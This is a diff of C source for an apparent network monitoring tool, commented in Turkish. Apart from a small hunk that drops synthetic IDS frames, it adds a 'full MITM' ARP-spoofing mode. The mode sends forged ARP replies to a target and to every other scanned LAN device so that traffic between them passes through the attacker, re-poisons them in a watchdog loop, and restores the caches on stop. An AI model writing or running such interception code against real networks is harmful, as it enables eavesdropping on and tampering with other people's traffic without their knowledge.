@@ -1552,37 +1552,9 @@ static int parse_proc_net_line(const char *line, const char *proto, PacketRecord
               pkt->src_ip, local_port, pkt->dst_ip, remote_port,
               pkt->protocol, is_tcp ? pkt->flags : "");
 
-    /* /proc/net modunda IDS icin sentetik ham cerceve uret
-       (SYN_SENT: biz -> uzak, SYN_RECV: uzak -> biz saldirgan) */
-    if (is_tcp && !is_v6 && (state == 2 || state == 3)) {
-        unsigned char *r = pkt->raw_data;
-        memset(r, 0, MAX_RAW_SIZE);
-        r[12] = 0x08; r[13] = 0x00;              /* EtherType IPv4 */
-        r[14] = 0x45;                            /* IPv4, IHL=5 */
-        r[23] = 6;                               /* TCP */
-        unsigned int a[4] = {0}, b[4] = {0};
-        sscanf(pkt->src_ip, "%u.%u.%u.%u", &a[0], &a[1], &a[2], &a[3]);
-        sscanf(pkt->dst_ip, "%u.%u.%u.%u", &b[0], &b[1], &b[2], &b[3]);
-        unsigned char src_b[4] = {(unsigned char)a[0], (unsigned char)a[1],
-                                  (unsigned char)a[2], (unsigned char)a[3]};
-        unsigned char dst_b[4] = {(unsigned char)b[0], (unsigned char)b[1],
-                                  (unsigned char)b[2], (unsigned char)b[3]};
-        if (state == 3) { /* SYN_RECV: uzak taraf SYN gonderiyor */
-            memcpy(r + 26, dst_b, 4); memcpy(r + 30, src_b, 4);
-            r[34] = (unsigned char)(remote_port >> 8);
-            r[35] = (unsigned char)(remote_port & 0xFF);
-            r[36] = (unsigned char)(local_port >> 8);
-            r[37] = (unsigned char)(local_port & 0xFF);
-        } else {         /* SYN_SENT: biz SYN gonderiyoruz */
-            memcpy(r + 26, src_b, 4); memcpy(r + 30, dst_b, 4);
-            r[34] = (unsigned char)(local_port >> 8);
-            r[35] = (unsigned char)(local_port & 0xFF);
-            r[36] = (unsigned char)(remote_port >> 8);
-            r[37] = (unsigned char)(remote_port & 0xFF);
-        }
-        r[46] = 0x50; r[47] = 0x02;              /* TCP hdr uzunlugu 5, SYN */
-        pkt->raw_len = 54;
-    }
+    /* NOT: /proc/net modunda IDS icin sentetik ham cerceve URETILMEZ.
+       Kullanici talebi: sadece gercek paket verisi islenir, uydurma
+       kareler uretilip IDS'ye beslenmez. raw_data bu modda bos kalir. */
 
     return 1;
 }
@@ -2024,6 +1996,15 @@ static int  g_spoof_target_count = 0;
 static platform_mutex_t g_spoof_lock;
 static int  g_spoof_lock_init = 0;
 
+/* ---- TAM MITM (full mesh): tek hedef izlerken hedefin LAN'daki tum
+ *      partner cihazlarla olan trafigini de ele gecir.
+ *      Hedefe: "partner'in IP'si = benim MAC" + partnere: "hedefin
+ *      IP'si = benim MAC" seklinde 2xN ARP reply gonderilir. ---- */
+#define MAX_SPOOF_PARTNERS 256
+static SpoofTarget g_spoof_partners[MAX_SPOOF_PARTNERS];
+static int  g_spoof_partner_count = 0;
+static int  g_full_mitm_mode = 0;
+
 /* --- Yardımcı: Kendi MAC adresimizi al --- */
 static int spoof_get_own_mac(const char *iface, unsigned char *mac) {
     struct ifreq ifr;
@@ -2194,6 +2175,15 @@ static int spoof_is_target_ip(const char *ip) {
     return 0;
 }
 
+/* Partner listesinde mi (tam MITM partneri) */
+static int spoof_is_partner_ip(const char *ip) {
+    if (!ip || !ip[0]) return 0;
+    for (int i = 0; i < g_spoof_partner_count; i++) {
+        if (strcmp(ip, g_spoof_partners[i].ip) == 0) return 1;
+    }
+    return 0;
+}
+
 /* Bir hedef IP icin kayitli son gorulme zamani (epoch saniye) */
 static double spoof_target_last_seen_raw(const char *ip) {
     if (!ip || !ip[0]) return 0.0;
@@ -2231,6 +2221,19 @@ static void arp_spoof_watchdog(int raw_fd, int single_mode) {
             send_arp_reply(raw_fd, g_spoof_iface,
                            g_my_mac, g_spoof_target_ip,
                            g_gateway_mac, g_spoof_gateway_ip);
+            /* TAM MITM: partner kanallarini da yeniden zehirle */
+            if (g_full_mitm_mode) {
+                for (int i = 0; i < g_spoof_partner_count; i++) {
+                    SpoofTarget *pt = &g_spoof_partners[i];
+                    if (!pt->mac_valid || !pt->ip[0]) continue;
+                    send_arp_reply(raw_fd, g_spoof_iface,
+                                   g_my_mac, pt->ip,
+                                   g_target_mac, g_spoof_target_ip);
+                    send_arp_reply(raw_fd, g_spoof_iface,
+                                   g_my_mac, g_spoof_target_ip,
+                                   pt->mac, pt->ip);
+                }
+            }
             g_target_last_seen = now;
             acted = 1;
         }
@@ -2266,6 +2269,10 @@ static void arp_spoof_note_seen(PacketRecord *pkt) {
                 }
             }
         }
+    } else if (g_full_mitm_mode && g_spoof_target_ip[0] &&
+               spoof_is_partner_ip(pkt->src_ip)) {
+        /* TAM MITM: hedef <-> partner trafigi bizden gecti => hedef aktif */
+        g_target_last_seen = now;
     }
     platform_mutex_unlock(&g_spoof_lock);
 }
@@ -2363,6 +2370,23 @@ static void *arp_spoof_loop(void *arg) {
                 send_arp_reply(raw_fd, g_spoof_iface,
                                g_my_mac, g_spoof_target_ip,
                                g_gateway_mac, g_spoof_gateway_ip);
+
+                /* TAM MITM: hedefin LAN partnerleriyle trafigi de bizden
+                 * gecsin. Hedefe: "partner'in IP'si benim" (hedef => partner
+                 * yonunde trafigi bize yonlendir), partnere: "hedefin IP'si
+                 * benim" (partner => hedef trafigini bize yonlendir). */
+                if (g_full_mitm_mode) {
+                    for (int i = 0; i < g_spoof_partner_count; i++) {
+                        SpoofTarget *pt = &g_spoof_partners[i];
+                        if (!pt->mac_valid || !pt->ip[0]) continue;
+                        send_arp_reply(raw_fd, g_spoof_iface,
+                                       g_my_mac, pt->ip,
+                                       g_target_mac, g_spoof_target_ip);
+                        send_arp_reply(raw_fd, g_spoof_iface,
+                                       g_my_mac, g_spoof_target_ip,
+                                       pt->mac, pt->ip);
+                    }
+                }
             }
         } else {
             /* Tum hedefleri zehirle: her cihaz icin 2 ARP Reply */
@@ -2404,6 +2428,24 @@ static void *arp_spoof_loop(void *arg) {
                                g_target_mac, g_spoof_target_ip,
                                g_gateway_mac, g_spoof_gateway_ip);
                 if (r < 3) platform_sleep_ms(200);
+            }
+            /* TAM MITM: partnerlerin ARP cache'lerini geri yukle —
+             * hedefe partnerlerin gercek MAC'ini, partnerlere hedefin
+             * gercek MAC'ini bildir */
+            if (g_full_mitm_mode) {
+                for (int i = 0; i < g_spoof_partner_count; i++) {
+                    SpoofTarget *pt = &g_spoof_partners[i];
+                    if (!pt->mac_valid || !pt->ip[0]) continue;
+                    for (int r = 0; r < 2; r++) {
+                        send_arp_reply(raw_fd, g_spoof_iface,
+                                       pt->mac, pt->ip,
+                                       g_target_mac, g_spoof_target_ip);
+                        send_arp_reply(raw_fd, g_spoof_iface,
+                                       g_target_mac, g_spoof_target_ip,
+                                       pt->mac, pt->ip);
+                    }
+                    platform_sleep_ms(50);
+                }
             }
         }
     } else {
@@ -2774,6 +2816,71 @@ int arp_spoof_get_target_count(void) {
     return g_spoof_target_count;
 }
 
+/* TAM MITM partner listesini tarayici sonuclarindan doldur.
+ * Hedefin kendisi, yerel IP ve gateway disindaki tum cihazlar partnerdir.
+ * count<=0 ise liste temizlenir. */
+void arp_spoof_sync_partners(const Device *devices, int count,
+                             const char *target_ip, const char *local_ip,
+                             const char *gateway_ip) {
+    platform_mutex_lock(&g_spoof_lock);
+    g_spoof_partner_count = 0;
+    memset(g_spoof_partners, 0, sizeof(g_spoof_partners));
+    if (!devices || count <= 0) {
+        platform_mutex_unlock(&g_spoof_lock);
+        return;
+    }
+    for (int i = 0; i < count && g_spoof_partner_count < MAX_SPOOF_PARTNERS; i++) {
+        const Device *d = &devices[i];
+        if (!d->ip[0] || !d->mac[0]) continue;
+        if (target_ip && strcmp(d->ip, target_ip) == 0) continue;
+        if (local_ip && strcmp(d->ip, local_ip) == 0) continue;
+        if (gateway_ip && strcmp(d->ip, gateway_ip) == 0) continue;
+        SpoofTarget *t = &g_spoof_partners[g_spoof_partner_count];
+        strncpy(t->ip, d->ip, sizeof(t->ip) - 1);
+        t->mac_valid = (spoof_parse_mac(d->mac, t->mac) == 0);
+        g_spoof_partner_count++;
+    }
+    platform_mutex_unlock(&g_spoof_lock);
+}
+
+/* TAM MITM modunu ac/kapa (tek hedef izlerken hedef <-> tum partnerler) */
+void arp_spoof_set_full_mitm(int enabled) {
+    g_full_mitm_mode = enabled ? 1 : 0;
+    if (g_full_mitm_mode) {
+        fprintf(stderr, "[ARP_SPOOF] TAM MITM: hedef <-> %d partner zehirlenecek\n",
+                g_spoof_partner_count);
+    }
+}
+
+int arp_spoof_get_full_mitm(void) {
+    return g_full_mitm_mode;
+}
+
+int arp_spoof_get_partner_count(void) {
+    return g_spoof_partner_count;
+}
+
+/* IPv4/IPv6 forwarding durumu (diagnostik): 1=acik, 0=kapali, -1=okunamadi */
+int arp_spoof_ip_forward_status(void) {
+    int v = -1;
+    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "r");
+    if (f) {
+        if (fscanf(f, "%d", &v) != 1) v = -1;
+        fclose(f);
+    }
+    return v;
+}
+
+int arp_spoof_ipv6_forward_status(void) {
+    int v = -1;
+    FILE *f = fopen("/proc/sys/net/ipv6/conf/all/forwarding", "r");
+    if (f) {
+        if (fscanf(f, "%d", &v) != 1) v = -1;
+        fclose(f);
+    }
+    return v;
+}
+
 void arp_spoof_stop(void) {
     if (!g_arp_spoof_running) return;
     g_arp_spoof_running = 0;
@@ -2787,6 +2894,9 @@ void arp_spoof_stop(void) {
 
     g_spoof_target_ip[0] = '\0';
     g_spoof_target_count = 0;
+    g_spoof_partner_count = 0;
+    g_full_mitm_mode = 0;
+    memset(g_spoof_partners, 0, sizeof(g_spoof_partners));
     g_target_last_seen = 0.0;
     g_gateway_mac_valid = 0;
     g_gateway_v6_valid = 0;
